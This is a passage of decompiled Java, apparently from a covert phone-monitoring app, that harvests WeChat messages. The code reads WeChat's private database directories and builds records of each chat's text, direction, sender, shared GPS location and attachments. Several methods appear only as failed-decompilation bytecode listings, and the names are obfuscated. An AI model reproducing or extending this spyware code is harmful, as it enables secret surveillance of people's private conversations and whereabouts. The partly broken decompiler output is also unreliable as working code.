            ((com.vvt.events.d)localObject5).c((String)localObject6);
            localObject6 = ((com.vvt.im.events.info.a)localObject1).f();
            ((com.vvt.events.d)localObject5).d((String)localObject6);
            localObject1 = ((com.vvt.im.events.info.a)localObject1).d();
            ((com.vvt.events.d)localObject5).a((byte[])localObject1);
            ((List)localObject4).add(localObject5);
        }
        boolean bool2 = false;
        localObject1 = null;
        i = paramWeChatData.a();
        int n = MessageType.ShareLocation.getNumber();
        i &= n;
        Object localObject5 = MessageType.ShareLocation;
        n = ((MessageType)localObject5).getNumber();
        if (i == n)
        {
            localObject1 = new com/vvt/events/e;
            ((com.vvt.events.e)localObject1).<init>();
            float f = paramWeChatData.g().d();
            ((com.vvt.events.e)localObject1).a(f);
            double d1 = paramWeChatData.g().a();
            ((com.vvt.events.e)localObject1).a(d1);
            d1 = paramWeChatData.g().b();
            ((com.vvt.events.e)localObject1).b(d1);
            localObject2 = paramWeChatData.g().c();
            ((com.vvt.events.e)localObject1).a((String)localObject2);
        }
        localObject2 = paramWeChatData.i().a();
        ((FxIMMessageEvent)localObject3).setConversationId((String)localObject2);
        localObject2 = paramWeChatData.d();
        localObject5 = WeChatData.Direction.IN;
        if (localObject2 == localObject5) {}
        for (localObject2 = FxEventDirection.IN;; localObject2 = FxEventDirection.OUT)
        {
            ((FxIMMessageEvent)localObject3).setDirection((FxEventDirection)localObject2);
            long l3 = paramWeChatData.b();
            ((FxIMMessageEvent)localObject3).setEventTime(l3);
            i = FxIMMessageServiceType.WECHAT.getValue();
            ((FxIMMessageEvent)localObject3).setImServiceId(i);
            localObject2 = paramWeChatData.c();
            ((FxIMMessageEvent)localObject3).setMessage((String)localObject2);
            localObject2 = new com/vvt/events/e;
            ((com.vvt.events.e)localObject2).<init>();
            ((FxIMMessageEvent)localObject3).setMessageLocation((com.vvt.events.e)localObject2);
            ((FxIMMessageEvent)localObject3).setShareLocation((com.vvt.events.e)localObject1);
            int m = paramWeChatData.a();
            ((FxIMMessageEvent)localObject3).setTextRepresentation(m);
            localObject1 = paramWeChatData.d();
            localObject2 = WeChatData.Direction.IN;
            if (localObject1 == localObject2)
            {
                localObject1 = paramWeChatData.h().a();
                ((FxIMMessageEvent)localObject3).setSenderId((String)localObject1);
            }
            localObject2 = ((List)localObject4).iterator();
            for (;;)
            {
                bool3 = ((Iterator)localObject2).hasNext();
                if (!bool3) {
                    break;
                }
                localObject1 = (com.vvt.events.d)((Iterator)localObject2).next();
                ((FxIMMessageEvent)localObject3).addAttachment((com.vvt.events.d)localObject1);
            }
        }
        localArrayList.add(localObject3);
        boolean bool3 = b;
        if (bool3) {}
        return localArrayList;
    }

    private static boolean a(int paramInt, com.vvt.base.b paramb, long paramLong)
    {
        int i = 1;
        float f = Float.MIN_VALUE;
        boolean bool3 = false;
        boolean bool4 = b;
        if (bool4) {}
        long l1 = 0L;
        bool4 = paramLong < l1;
        if (!bool4) {}
        boolean bool2;
        for (bool4 = false;; bool4 = bool2)
        {
            long l2;
            if (paramInt == i)
            {
                l2 = paramb.b();
                boolean bool1 = paramLong < l2;
                if (!bool1) {
                    break label103;
                }
            }
            for (;;)
            {
                bool4 = b;
                if (bool4) {}
                return bool3;
                int j = 3;
                f = 4.2E-45F;
                if (paramInt == j)
                {
                    l2 = paramb.c();
                    bool2 = paramLong < l2;
                    if (bool2) {}
                }
                else
                {
                    label103:
                    do
                    {
                        bool3 = bool4;
                        break;
                        l2 = paramb.e();
                        bool2 = paramLong < l2;
                    } while (!bool2);
                }
            }
        }
    }

    /* Error */
    private static boolean a(String paramString)
    {
        // Byte code:
        //   0: iconst_0
        //   1: istore_1
        //   2: aconst_null
        //   3: astore_2
        //   4: iconst_0
        //   5: istore_3
        //   6: aconst_null
        //   7: astore 4
        //   9: new 325	java/io/RandomAccessFile
        //   12: astore 5
        //   14: ldc_w 327
        //   17: astore 6
        //   19: aload 5
        //   21: aload_0
        //   22: aload 6
        //   24: invokespecial 345	java/io/RandomAccessFile:<init>	(Ljava/lang/String;Ljava/lang/String;)V
        //   27: bipush 9
        //   29: istore_3
        //   30: iload_3
        //   31: newarray <illegal type>
        //   33: astore 4
        //   35: lconst_1
        //   36: lstore 7
        //   38: aload 5
        //   40: lload 7
        //   42: invokevirtual 334	java/io/RandomAccessFile:seek	(J)V
        //   45: aconst_null
        //   46: astore 6
        //   48: bipush 9
        //   50: istore 9
        //   52: aload 5
        //   54: aload 4
        //   56: iconst_0
        //   57: iload 9
        //   59: invokevirtual 849	java/io/RandomAccessFile:read	([BII)I
        //   62: pop
        //   63: new 143	java/lang/String
        //   66: astore 6
        //   68: aload 6
        //   70: aload 4
        //   72: invokespecial 851	java/lang/String:<init>	([B)V
        //   75: getstatic 17	com/vvt/capture/wechat/removeFromPath:removeFromPath	Z
        //   78: istore_3
        //   79: iload_3
        //   80: ifeq +3 -> 83
        //   83: ldc_w 853
        //   86: astore 4
        //   88: aload 6
        //   90: aload 4
        //   92: invokevirtual 856	java/lang/String:endsWith	(Ljava/lang/String;)Z
        //   95: istore_3
        //   96: iload_3
        //   97: ifeq +69 -> 166
        //   100: iconst_1
        //   101: istore_1
        //   102: aload 5
        //   104: ifnull +8 -> 112
        //   107: aload 5
        //   109: invokevirtual 350	java/io/RandomAccessFile:close	()V
        //   112: iload_1
        //   113: ireturn
        //   114: astore 5
        //   116: aconst_null
        //   117: astore 5
        //   119: getstatic 26	com/vvt/capture/wechat/removeFromPath:e	Z
        //   122: istore_3
        //   123: iload_3
        //   124: ifeq +3 -> 127
        //   127: aload 5
        //   129: ifnull -17 -> 112
        //   132: aload 5
        //   134: invokevirtual 350	java/io/RandomAccessFile:close	()V
        //   137: goto -25 -> 112
        //   140: astore 5
        //   142: goto -30 -> 112
        //   145: astore_2
        //   146: aconst_null
        //   147: astore 5
        //   149: aload 5
        //   151: ifnull +8 -> 159
        //   154: aload 5
        //   156: invokevirtual 350	java/io/RandomAccessFile:close	()V
        //   159: aload_2
        //   160: athrow
        //   161: astore 5
        //   163: goto -4 -> 159
        //   166: aload 5
        //   168: ifnull -56 -> 112
        //   171: aload 5
        //   173: invokevirtual 350	java/io/RandomAccessFile:close	()V
        //   176: goto -64 -> 112
        //   179: astore_2
        //   180: goto -31 -> 149
        //   183: astore 4
        //   185: goto -66 -> 119
        // Local variable table:
        //   start	length	slot	name	signature
        //   0	188	0	paramString	String
        //   1	112	1	bool1	boolean
        //   3	1	2	localObject1	Object
        //   145	15	2	localObject2	Object
        //   179	1	2	localObject3	Object
        //   5	26	3	i	int
        //   78	46	3	bool2	boolean
        //   7	84	4	localObject4	Object
        //   183	1	4	localException1	Exception
        //   12	96	5	localRandomAccessFile	RandomAccessFile
        //   114	1	5	localException2	Exception
        //   117	16	5	localObject5	Object
        //   140	1	5	localIOException1	java.io.IOException
        //   147	8	5	localObject6	Object
        //   161	11	5	localIOException2	java.io.IOException
        //   17	72	6	str	String
        //   36	5	7	l	long
        //   50	8	9	j	int
        // Exception table:
        //   from	to	target	type
        //   9	12	114	java/lang/Exception
        //   22	27	114	java/lang/Exception
        //   107	112	140	java/io/IOException
        //   132	137	140	java/io/IOException
        //   171	176	140	java/io/IOException
        //   9	12	145	finally
        //   22	27	145	finally
        //   154	159	161	java/io/IOException
        //   30	33	179	finally
        //   40	45	179	finally
        //   57	63	179	finally
        //   63	66	179	finally
        //   70	75	179	finally
        //   75	78	179	finally
        //   90	95	179	finally
        //   119	122	179	finally
        //   30	33	183	java/lang/Exception
        //   40	45	183	java/lang/Exception
        //   57	63	183	java/lang/Exception
        //   63	66	183	java/lang/Exception
        //   70	75	183	java/lang/Exception
        //   75	78	183	java/lang/Exception
        //   90	95	183	java/lang/Exception
    }

    /* Error */
    private static com.vvt.im.events.info.c b(String paramString)
    {
        // Byte code:
        //   0: iconst_0
        //   1: istore_1
        //   2: aconst_null
        //   3: astore_2
        //   4: dconst_0
        //   5: dstore_3
        //   6: iconst_0
        //   7: istore 5
        //   9: aconst_null
        //   10: astore 6
        //   12: getstatic 17	com/vvt/capture/wechat/removeFromPath:removeFromPath	Z
        //   15: istore 7
        //   17: iload 7
        //   19: ifeq +3 -> 22
        //   22: invokestatic 864	javax/xml/parsers/DocumentBuilderFactory:newInstance	()Ljavax/xml/parsers/DocumentBuilderFactory;
        //   25: astore 8
        //   27: iconst_1
        //   28: istore 9
        //   30: aload 8
        //   32: iload 9
        //   34: invokevirtual 867	javax/xml/parsers/DocumentBuilderFactory:setCoalescing	(Z)V
        //   37: aload 8
        //   39: invokevirtual 871	javax/xml/parsers/DocumentBuilderFactory:newDocumentBuilder	()Ljavax/xml/parsers/DocumentBuilder;
        //   42: astore 8
        //   44: new 873	org/xml/sax/InputSource
        //   47: astore 10
        //   49: aload 10
        //   51: invokespecial 874	org/xml/sax/InputSource:<init>	()V
        //   54: new 876	java/io/ByteArrayInputStream
        //   57: astore 11
        //   59: ldc_w 878
        //   62: astore 12
        //   64: aload_0
        //   65: aload 12
        //   67: invokevirtual 882	java/lang/String:getBytes	(Ljava/lang/String;)[B
        //   70: astore 12
        //   72: aload 11
        //   74: aload 12
        //   76: invokespecial 883	java/io/ByteArrayInputStream:<init>	([B)V
        //   79: new 885	java/io/InputStreamReader
        //   82: astore 12
        //   84: ldc_w 878
        //   87: astore 13
        //   89: aload 12
        //   91: aload 11
        //   93: aload 13
        //   95: invokespecial 888	java/io/InputStreamReader:<init>	(Ljava/io/InputStream;Ljava/lang/String;)V
        //   98: aload 10
        //   100: aload 12
        //   102: invokevirtual 892	org/xml/sax/InputSource:setCharacterStream	(Ljava/io/Reader;)V
        //   105: aload 8
        //   107: aload 10
        //   109: invokevirtual 898	javax/xml/parsers/DocumentBuilder:parse	(Lorg/xml/sax/InputSource;)Lorg/w3c/dom/Document;
        //   112: astore 8
        //   114: aload 8
        //   116: invokeinterface 904 1 0
        //   121: astore 10
        //   123: aload 10
        //   125: invokeinterface 909 1 0
        //   130: ldc_w 911
        //   133: astore 10
        //   135: aload 8
        //   137: aload 10
        //   139: invokeinterface 915 2 0
        //   144: astore 10
        //   146: ldc_w 282
        //   149: astore 8
        //   151: aconst_null
        //   152: astore 13
        //   154: aload 10
        //   156: invokeinterface 920 1 0
        //   161: istore 14
        //   163: iconst_0
        //   164: iload 14
        //   166: if_icmpge +364 -> 530
        //   169: aload 10
        //   171: iconst_0
        //   172: invokeinterface 924 2 0
        //   177: astore 13
        //   179: new 777	com/vvt/im/events/info/MyUncaughtExceptionHandler
        //   182: astore 10
        //   184: aload 10
        //   186: invokespecial 925	com/vvt/im/events/info/MyUncaughtExceptionHandler:<init>	()V
        //   189: aload 13
        //   191: invokeinterface 931 1 0
        //   196: astore 13
        //   198: iconst_0
        //   199: istore 5
        //   201: aconst_null
        //   202: astore 6
        //   204: aload 13
        //   206: invokeinterface 934 1 0
        //   211: istore_1
        //   212: iload 5
        //   214: iload_1
        //   215: if_icmpge +311 -> 526
        //   218: aload 13
        //   220: iload 5
        //   222: invokeinterface 935 2 0
        //   227: astore_2
        //   228: aload_2
        //   229: invokeinterface 938 1 0
        //   234: astore 15
        //   236: ldc_w 940
        //   239: astore 16
        //   241: aload 15
        //   243: aload 16
        //   245: invokevirtual 718	java/lang/String:equalsIgnoreCase	(Ljava/lang/String;)Z
        //   248: istore 14
        //   250: iload 14
        //   252: ifeq +32 -> 284
        //   255: aload_2
        //   256: invokeinterface 943 1 0
        //   261: astore_2
        //   262: aload_2
        //   263: invokestatic 949	java/lang/Double:parseDouble	(Ljava/lang/String;)D
        //   266: dstore 17
        //   268: aload 10
        //   270: dload 17
        //   272: invokevirtual 950	com/vvt/im/events/info/MyUncaughtExceptionHandler:removeFromPath	(D)V
        //   275: iload 5
        //   277: iconst_1
        //   278: iadd
        //   279: istore 5
        //   281: goto -77 -> 204
        //   284: aload_2
        //   285: invokeinterface 938 1 0
        //   290: astore 15
        //   292: ldc_w 952
        //   295: astore 16
        //   297: aload 15
        //   299: aload 16
        //   301: invokevirtual 718	java/lang/String:equalsIgnoreCase	(Ljava/lang/String;)Z
        //   304: istore 14
        //   306: iload 14
        //   308: ifeq +96 -> 404
        //   311: aload_2
        //   312: invokeinterface 943 1 0
        //   317: astore_2
        //   318: aload_2
        //   319: invokestatic 949	java/lang/Double:parseDouble	(Ljava/lang/String;)D
        //   322: dstore 17
        //   324: aload 10
        //   326: dload 17
        //   328: invokevirtual 953	com/vvt/im/events/info/MyUncaughtExceptionHandler:a	(D)V
        //   331: goto -56 -> 275
        //   334: astore 8
        //   336: aload 11
        //   338: astore 6
        //   340: aload 10
        //   342: astore 11
        //   344: ldc_w 955
        //   347: astore 10
        //   349: ldc_w 957
        //   352: astore_2
        //   353: aload 10
        //   355: aload_2
        //   356: aload 8
        //   358: invokestatic 962	android/util/Log:e	(Ljava/lang/String;Ljava/lang/String;Ljava/lang/Throwable;)I
        //   361: pop
        //   362: aload 12
        //   364: invokevirtual 963	java/io/InputStreamReader:close	()V
        //   367: aload 6
        //   369: invokestatic 966	com/vvt/io/d:a	(Ljava/io/InputStream;)V
        //   372: aload 11
        //   374: astore 8
        //   376: aload 8
        //   378: ifnull +265 -> 643
        //   381: getstatic 17	com/vvt/capture/wechat/removeFromPath:removeFromPath	Z
        //   384: istore 9
        //   386: iload 9
        //   388: ifeq +3 -> 391
        //   391: getstatic 17	com/vvt/capture/wechat/removeFromPath:removeFromPath	Z
        //   394: istore 9
        //   396: iload 9
        //   398: ifeq +3 -> 401
        //   401: aload 8
        //   403: areturn
        //   404: aload_2
        //   405: invokeinterface 938 1 0
        //   410: astore 15
        //   412: ldc_w 968
        //   415: astore 16
        //   417: aload 15
        //   419: aload 16
        //   421: invokevirtual 718	java/lang/String:equalsIgnoreCase	(Ljava/lang/String;)Z
        //   424: istore 14
        //   426: iload 14
        //   428: ifeq +14 -> 442
        //   431: aload_2
        //   432: invokeinterface 943 1 0
        //   437: astore 8
        //   439: goto -164 -> 275
        //   442: aload_2
        //   443: invokeinterface 938 1 0
        //   448: astore 15
        //   450: ldc_w 970
        //   453: astore 16
        //   455: aload 15
        //   457: aload 16
        //   459: invokevirtual 718	java/lang/String:equalsIgnoreCase	(Ljava/lang/String;)Z
        //   462: istore 14
        //   464: iload 14
        //   466: ifeq -191 -> 275
        //   469: aload_2
        //   470: invokeinterface 943 1 0
        //   475: astore_2
        //   476: aload 10
        //   478: aload_2
        //   479: invokevirtual 971	com/vvt/im/events/info/MyUncaughtExceptionHandler:a	(Ljava/lang/String;)V
        //   482: goto -207 -> 275
        //   485: astore 8
        //   487: aload 10
        //   489: astore 6
        //   491: ldc_w 955
        //   494: astore 10
        //   496: ldc_w 957
        //   499: astore_2
        //   500: aload 10
        //   502: aload_2
        //   503: aload 8
        //   505: invokestatic 962	android/util/Log:e	(Ljava/lang/String;Ljava/lang/String;Ljava/lang/Throwable;)I
        //   508: pop
        //   509: aload 12
        //   511: invokevirtual 963	java/io/InputStreamReader:close	()V
        //   514: aload 11
        //   516: invokestatic 966	com/vvt/io/d:a	(Ljava/io/InputStream;)V
        //   519: aload 6
        //   521: astore 8
        //   523: goto -147 -> 376
        //   526: aload 10
        //   528: astore 6
        //   530: aload 6
        //   532: invokevirtual 794	com/vvt/im/events/info/MyUncaughtExceptionHandler:MyUncaughtExceptionHandler	()Ljava/lang/String;
        //   535: astore 10
        //   537: aload 10
        //   539: invokestatic 210	com/vvt/ag/removeFromPath:a	(Ljava/lang/String;)Z
        //   542: istore 19
        //   544: iload 19
        //   546: ifeq +10 -> 556
        //   549: aload 6
        //   551: aload 8
        //   553: invokevirtual 971	com/vvt/im/events/info/MyUncaughtExceptionHandler:a	(Ljava/lang/String;)V
        //   556: aload 12
        //   558: invokevirtual 963	java/io/InputStreamReader:close	()V
        //   561: aload 11
        //   563: invokestatic 966	com/vvt/io/d:a	(Ljava/io/InputStream;)V
        //   566: aload 6
        //   568: astore 8
        //   570: goto -194 -> 376
        //   573: astore 8
        //   575: iconst_0
        //   576: istore 9
        //   578: aconst_null
        //   579: astore 12
        //   581: aconst_null
        //   582: astore 11
        //   584: ldc_w 955
        //   587: astore 10
        //   589: ldc_w 957
        //   592: astore_2
        //   593: aload 10
        //   595: aload_2
        //   596: aload 8
        //   598: invokestatic 962	android/util/Log:e	(Ljava/lang/String;Ljava/lang/String;Ljava/lang/Throwable;)I
        //   601: pop
        //   602: aload 12
        //   604: invokevirtual 963	java/io/InputStreamReader:close	()V
        //   607: aload 11
        //   609: invokestatic 966	com/vvt/io/d:a	(Ljava/io/InputStream;)V
        //   612: aload 6
        //   614: astore 8
        //   616: goto -240 -> 376
        //   619: astore 8
        //   621: iconst_0
        //   622: istore 9
        //   624: aconst_null
        //   625: astore 12
        //   627: aconst_null
        //   628: astore 11
        //   630: aload 12
        //   632: invokevirtual 963	java/io/InputStreamReader:close	()V
        //   635: aload 11
        //   637: invokestatic 966	com/vvt/io/d:a	(Ljava/io/InputStream;)V
        //   640: aload 8
        //   642: athrow
        //   643: new 777	com/vvt/im/events/info/MyUncaughtExceptionHandler
        //   646: astore 8
        //   648: aload 8
        //   650: invokespecial 925	com/vvt/im/events/info/MyUncaughtExceptionHandler:<init>	()V
        //   653: aload 8
        //   655: fconst_0
        //   656: invokevirtual 972	com/vvt/im/events/info/MyUncaughtExceptionHandler:a	(F)V
        //   659: aload 8
        //   661: fconst_0
        //   662: invokevirtual 974	com/vvt/im/events/info/MyUncaughtExceptionHandler:removeFromPath	(F)V
        //   665: aload 8
        //   667: dload_3
        //   668: invokevirtual 953	com/vvt/im/events/info/MyUncaughtExceptionHandler:a	(D)V
        //   671: aload 8
        //   673: dload_3
        //   674: invokevirtual 950	com/vvt/im/events/info/MyUncaughtExceptionHandler:removeFromPath	(D)V
        //   677: ldc_w 282
        //   680: astore 12
        //   682: aload 8
        //   684: aload 12
        //   686: invokevirtual 971	com/vvt/im/events/info/MyUncaughtExceptionHandler:a	(Ljava/lang/String;)V
        //   689: goto -298 -> 391
        //   692: astore 12
        //   694: goto -59 -> 635
        //   697: astore 8
        //   699: goto -332 -> 367
        //   702: astore 8
        //   704: goto -190 -> 514
        //   707: astore 8
        //   709: goto -102 -> 607
        //   712: astore 8
        //   714: goto -153 -> 561
        //   717: astore 8
        //   719: iconst_0
        //   720: istore 9
        //   722: aconst_null
        //   723: astore 12
        //   725: goto -95 -> 630
        //   728: astore 8
        //   730: goto -100 -> 630
        //   733: astore 8
        //   735: aload 6
        //   737: astore 11
        //   739: goto -109 -> 630
        //   742: astore 8
        //   744: iconst_0
        //   745: istore 9
        //   747: aconst_null
        //   748: astore 12
        //   750: goto -166 -> 584
        //   753: astore 8
        //   755: goto -171 -> 584
        //   758: astore 8
        //   760: aload 10
        //   762: astore 6
        //   764: goto -180 -> 584
        //   767: astore 8
        //   769: iconst_0
        //   770: istore 9
        //   772: aconst_null
        //   773: astore 12
        //   775: aconst_null
        //   776: astore 11
        //   778: goto -287 -> 491
        //   781: astore 8
        //   783: iconst_0
        //   784: istore 9
        //   786: aconst_null
        //   787: astore 12
        //   789: goto -298 -> 491
        //   792: astore 8
        //   794: goto -303 -> 491
        //   797: astore 8
        //   799: iconst_0
        //   800: istore 9
        //   802: aconst_null
        //   803: astore 12
        //   805: aconst_null
        //   806: astore 11
        //   808: goto -464 -> 344
        //   811: astore 8
        //   813: iconst_0
        //   814: istore 9
        //   816: aconst_null
        //   817: astore 12
        //   819: aload 11
        //   821: astore 20
        //   823: aconst_null
        //   824: astore 11
        //   826: aload 20
        //   828: astore 6
        //   830: goto -486 -> 344
        //   833: astore 8
        //   835: aload 11
        //   837: astore 20
        //   839: aconst_null
        //   840: astore 11
        //   842: aload 20
        //   844: astore 6
        //   846: goto -502 -> 344
        //   849: astore 8
        //   851: aload 11
        //   853: astore 20
        //   855: aload 6
        //   857: astore 11
        //   859: aload 20
        //   861: astore 6
        //   863: goto -519 -> 344
        // Local variable table:
        //   start	length	slot	name	signature
        //   0	866	0	paramString	String
        //   1	215	1	i	int
        //   3	593	2	localObject1	Object
        //   5	669	3	d1	double
        //   7	273	5	j	int
        //   10	852	6	localObject2	Object
        //   15	3	7	bool1	boolean
        //   25	125	8	localObject3	Object
        //   334	23	8	localParserConfigurationException1	javax.xml.parsers.ParserConfigurationException
        //   374	64	8	localObject4	Object
        //   485	19	8	localSAXException1	org.xml.sax.SAXException
        //   521	48	8	localObject5	Object
        //   573	24	8	localIOException1	java.io.IOException
        //   614	1	8	localObject6	Object
        //   619	22	8	localObject7	Object
        //   646	37	8	localc	com.vvt.im.events.info.MyUncaughtExceptionHandler
        //   697	1	8	localException1	Exception
        //   702	1	8	localException2	Exception
        //   707	1	8	localException3	Exception
        //   712	1	8	localException4	Exception
        //   717	1	8	localObject8	Object
        //   728	1	8	localObject9	Object
        //   733	1	8	localObject10	Object
        //   742	1	8	localIOException2	java.io.IOException
        //   753	1	8	localIOException3	java.io.IOException
        //   758	1	8	localIOException4	java.io.IOException
        //   767	1	8	localSAXException2	org.xml.sax.SAXException
        //   781	1	8	localSAXException3	org.xml.sax.SAXException
        //   792	1	8	localSAXException4	org.xml.sax.SAXException
        //   797	1	8	localParserConfigurationException2	javax.xml.parsers.ParserConfigurationException
        //   811	1	8	localParserConfigurationException3	javax.xml.parsers.ParserConfigurationException
        //   833	1	8	localParserConfigurationException4	javax.xml.parsers.ParserConfigurationException
        //   849	1	8	localParserConfigurationException5	javax.xml.parsers.ParserConfigurationException
        //   28	787	9	bool2	boolean
        //   47	714	10	localObject11	Object
        //   57	801	11	localObject12	Object
        //   62	623	12	localObject13	Object
        //   692	1	12	localException5	Exception
        //   723	95	12	localObject14	Object
        //   87	132	13	localObject15	Object
        //   161	6	14	k	int
        //   248	217	14	bool3	boolean
        //   234	222	15	str1	String
        //   239	219	16	str2	String
        //   266	61	17	d2	double
        //   542	3	19	bool4	boolean
        //   821	39	20	localObject16	Object
        // Exception table:
        //   from	to	target	type
        //   189	196	334	javax/xml/parsers/ParserConfigurationException
        //   204	211	334	javax/xml/parsers/ParserConfigurationException
        //   220	227	334	javax/xml/parsers/ParserConfigurationException
        //   228	234	334	javax/xml/parsers/ParserConfigurationException
        //   243	248	334	javax/xml/parsers/ParserConfigurationException
        //   255	261	334	javax/xml/parsers/ParserConfigurationException
        //   262	266	334	javax/xml/parsers/ParserConfigurationException
        //   270	275	334	javax/xml/parsers/ParserConfigurationException
        //   284	290	334	javax/xml/parsers/ParserConfigurationException
        //   299	304	334	javax/xml/parsers/ParserConfigurationException
        //   311	317	334	javax/xml/parsers/ParserConfigurationException
        //   318	322	334	javax/xml/parsers/ParserConfigurationException
        //   326	331	334	javax/xml/parsers/ParserConfigurationException
        //   404	410	334	javax/xml/parsers/ParserConfigurationException
        //   419	424	334	javax/xml/parsers/ParserConfigurationException
        //   431	437	334	javax/xml/parsers/ParserConfigurationException
        //   442	448	334	javax/xml/parsers/ParserConfigurationException
        //   457	462	334	javax/xml/parsers/ParserConfigurationException
        //   469	475	334	javax/xml/parsers/ParserConfigurationException
        //   478	482	334	javax/xml/parsers/ParserConfigurationException
        //   189	196	485	org/xml/sax/SAXException
        //   204	211	485	org/xml/sax/SAXException
        //   220	227	485	org/xml/sax/SAXException
        //   228	234	485	org/xml/sax/SAXException
        //   243	248	485	org/xml/sax/SAXException
        //   255	261	485	org/xml/sax/SAXException
        //   262	266	485	org/xml/sax/SAXException
        //   270	275	485	org/xml/sax/SAXException
        //   284	290	485	org/xml/sax/SAXException
        //   299	304	485	org/xml/sax/SAXException
        //   311	317	485	org/xml/sax/SAXException
        //   318	322	485	org/xml/sax/SAXException
        //   326	331	485	org/xml/sax/SAXException
        //   404	410	485	org/xml/sax/SAXException
        //   419	424	485	org/xml/sax/SAXException
        //   431	437	485	org/xml/sax/SAXException
        //   442	448	485	org/xml/sax/SAXException
        //   457	462	485	org/xml/sax/SAXException
        //   469	475	485	org/xml/sax/SAXException
        //   478	482	485	org/xml/sax/SAXException
        //   22	25	573	java/io/IOException
        //   32	37	573	java/io/IOException
        //   37	42	573	java/io/IOException
        //   44	47	573	java/io/IOException
        //   49	54	573	java/io/IOException
        //   54	57	573	java/io/IOException
        //   65	70	573	java/io/IOException
        //   74	79	573	java/io/IOException
        //   22	25	619	finally
        //   32	37	619	finally
        //   37	42	619	finally
        //   44	47	619	finally
        //   49	54	619	finally
        //   54	57	619	finally
        //   65	70	619	finally
        //   74	79	619	finally
        //   630	635	692	java/lang/Exception
        //   362	367	697	java/lang/Exception
        //   509	514	702	java/lang/Exception
        //   602	607	707	java/lang/Exception
        //   556	561	712	java/lang/Exception
        //   79	82	717	finally
        //   93	98	717	finally
        //   100	105	728	finally
        //   107	112	728	finally
        //   114	121	728	finally
        //   123	130	728	finally
        //   137	144	728	finally
        //   154	161	728	finally
        //   171	177	728	finally
        //   179	182	728	finally
        //   184	189	728	finally
        //   189	196	728	finally
        //   204	211	728	finally
        //   220	227	728	finally
        //   228	234	728	finally
        //   243	248	728	finally
        //   255	261	728	finally
        //   262	266	728	finally
        //   270	275	728	finally
        //   284	290	728	finally
        //   299	304	728	finally
        //   311	317	728	finally
        //   318	322	728	finally
        //   326	331	728	finally
        //   404	410	728	finally
        //   419	424	728	finally
        //   431	437	728	finally
        //   442	448	728	finally
        //   457	462	728	finally
        //   469	475	728	finally
        //   478	482	728	finally
        //   503	509	728	finally
        //   530	535	728	finally
        //   537	542	728	finally
        //   551	556	728	finally
        //   596	602	728	finally
        //   356	362	733	finally
        //   79	82	742	java/io/IOException
        //   93	98	742	java/io/IOException
        //   100	105	753	java/io/IOException
        //   107	112	753	java/io/IOException
        //   114	121	753	java/io/IOException
        //   123	130	753	java/io/IOException
        //   137	144	753	java/io/IOException
        //   154	161	753	java/io/IOException
        //   171	177	753	java/io/IOException
        //   179	182	753	java/io/IOException
        //   184	189	753	java/io/IOException
        //   530	535	753	java/io/IOException
        //   537	542	753	java/io/IOException
        //   551	556	753	java/io/IOException
        //   189	196	758	java/io/IOException
        //   204	211	758	java/io/IOException
        //   220	227	758	java/io/IOException
        //   228	234	758	java/io/IOException
        //   243	248	758	java/io/IOException
        //   255	261	758	java/io/IOException
        //   262	266	758	java/io/IOException
        //   270	275	758	java/io/IOException
        //   284	290	758	java/io/IOException
        //   299	304	758	java/io/IOException
        //   311	317	758	java/io/IOException
        //   318	322	758	java/io/IOException
        //   326	331	758	java/io/IOException
        //   404	410	758	java/io/IOException
        //   419	424	758	java/io/IOException
        //   431	437	758	java/io/IOException
        //   442	448	758	java/io/IOException
        //   457	462	758	java/io/IOException
        //   469	475	758	java/io/IOException
        //   478	482	758	java/io/IOException
        //   22	25	767	org/xml/sax/SAXException
        //   32	37	767	org/xml/sax/SAXException
        //   37	42	767	org/xml/sax/SAXException
        //   44	47	767	org/xml/sax/SAXException
        //   49	54	767	org/xml/sax/SAXException
        //   54	57	767	org/xml/sax/SAXException
        //   65	70	767	org/xml/sax/SAXException
        //   74	79	767	org/xml/sax/SAXException
        //   79	82	781	org/xml/sax/SAXException
        //   93	98	781	org/xml/sax/SAXException
        //   100	105	792	org/xml/sax/SAXException
        //   107	112	792	org/xml/sax/SAXException
        //   114	121	792	org/xml/sax/SAXException
        //   123	130	792	org/xml/sax/SAXException
        //   137	144	792	org/xml/sax/SAXException
        //   154	161	792	org/xml/sax/SAXException
        //   171	177	792	org/xml/sax/SAXException
        //   179	182	792	org/xml/sax/SAXException
        //   184	189	792	org/xml/sax/SAXException
        //   530	535	792	org/xml/sax/SAXException
        //   537	542	792	org/xml/sax/SAXException
        //   551	556	792	org/xml/sax/SAXException
        //   22	25	797	javax/xml/parsers/ParserConfigurationException
        //   32	37	797	javax/xml/parsers/ParserConfigurationException
        //   37	42	797	javax/xml/parsers/ParserConfigurationException
        //   44	47	797	javax/xml/parsers/ParserConfigurationException
        //   49	54	797	javax/xml/parsers/ParserConfigurationException
        //   54	57	797	javax/xml/parsers/ParserConfigurationException
        //   65	70	797	javax/xml/parsers/ParserConfigurationException
        //   74	79	797	javax/xml/parsers/ParserConfigurationException
        //   79	82	811	javax/xml/parsers/ParserConfigurationException
        //   93	98	811	javax/xml/parsers/ParserConfigurationException
        //   100	105	833	javax/xml/parsers/ParserConfigurationException
        //   107	112	833	javax/xml/parsers/ParserConfigurationException
        //   114	121	833	javax/xml/parsers/ParserConfigurationException
        //   123	130	833	javax/xml/parsers/ParserConfigurationException
        //   137	144	833	javax/xml/parsers/ParserConfigurationException
        //   154	161	833	javax/xml/parsers/ParserConfigurationException
        //   171	177	833	javax/xml/parsers/ParserConfigurationException
        //   179	182	833	javax/xml/parsers/ParserConfigurationException
        //   184	189	833	javax/xml/parsers/ParserConfigurationException
        //   530	535	849	javax/xml/parsers/ParserConfigurationException
        //   537	542	849	javax/xml/parsers/ParserConfigurationException
        //   551	556	849	javax/xml/parsers/ParserConfigurationException
    }

    public static ArrayList b()
    {
        int i = 3;
        int j = 2;
        int k = 1;
        ArrayList localArrayList = new java/util/ArrayList;
        localArrayList.<init>();
        Object[] arrayOfObject = new Object[i];
        arrayOfObject[0] = "/data/data";
        arrayOfObject[k] = "com.tencent.mm";
        arrayOfObject[j] = "MicroMsg";
        String str = String.format("%s/%s/%s", arrayOfObject);
        localArrayList.add(str);
        arrayOfObject = new Object[i];
        arrayOfObject[0] = "/dbdata/databases";
        arrayOfObject[k] = "com.tencent.mm";
        arrayOfObject[j] = "MicroMsg";
        str = String.format("%s/%s/%s", arrayOfObject);
        localArrayList.add(str);
        return localArrayList;
    }

    private static ArrayList b(SQLiteDatabase paramSQLiteDatabase, long paramLong, String paramString, com.vvt.base.b paramb)
    {
        int i = 1;
        int j = 0;
        Object[] arrayOfObject = null;
        boolean bool1 = b;
        if (bool1) {}
        Object localObject1 = new java/lang/StringBuilder;
